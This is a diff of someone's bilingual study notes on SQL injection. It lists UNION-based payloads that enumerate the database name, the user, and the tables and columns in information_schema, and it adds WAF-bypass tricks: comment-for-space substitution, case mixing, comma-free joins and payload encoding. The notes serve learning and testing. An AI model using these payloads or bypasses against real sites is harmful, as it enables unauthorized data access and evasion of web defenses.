@@ -19,21 +19,26 @@ Ans: The union result will show as second result with matching column of name an
 Therefore, if we just want the info we need, we can make the first clause not exist...  
 ```
 select name, password from users where id = 1 and 1 = 0 union select 1, 2;  
-
+```
+```
 // 秀出當前的庫名,使用者
-select name, password from users where id = 1 and 1 = 0 union select database(), system_user();  
-  
+select name, password from users where id = 1 and 1 = 0 union select database(), system_user();
+```
+```  
 // 可以得到目前資料庫下的表名,欄位名  
 ... union select column_name, table_name from information_schema.columns where table_schema=database(); 
-
+```
+```
 // 也可以得到其他資料庫的名字!  
 ... union select table_schema, table_name from information_schema.columns;  
 // 我的 k朋友說: 尋找 資料庫就應該用schemata, 回傳才不會重複而且有效率
 ... union select group_concat(schema_name) from information_schema.schemata;  // group_concat會將結果合併成一行,我們甚至不需要limit
-
+```
+```
 // 可以得到所有table和column的名字 
 ... union select table_name, column_name from information_schema.columns;
-
+```
+```
 // 回傳的結果太多 , 我們可以用 limit加以限制
 // 網頁常常只能show唯一的結果
 ... union select table_name, column_name from information_schema.columns limit 1, 1;  
@@ -57,7 +62,17 @@ Show the result in error message!
 Wait for my first time practice ><... 
   
 ### WAF bypass
-WAF is a defender for web.
+WAF is a defender for web.  
+繞過手勢:  
+- No 'space'  
+  - ```select/**/username/**/from/**/users;```
+  - ```union select 1,2``` -> ```union(select(1),2)```
+- No 'select'...  
+  - ```大小寫混淆 e.g. SelecT``` 
+- No comma ','  
+  - ```union select 1,2,3``` -> ```union select * from ((select 1)a join (select 2)b join (select 3)c);```   
+- Encode your payload  
+  - ```URL-ENCODE, HEXIDECIMAL, UNICODE```
   
 ### Webshell  
 Based on the provilege of db user, we can upload shell to read or write to db.
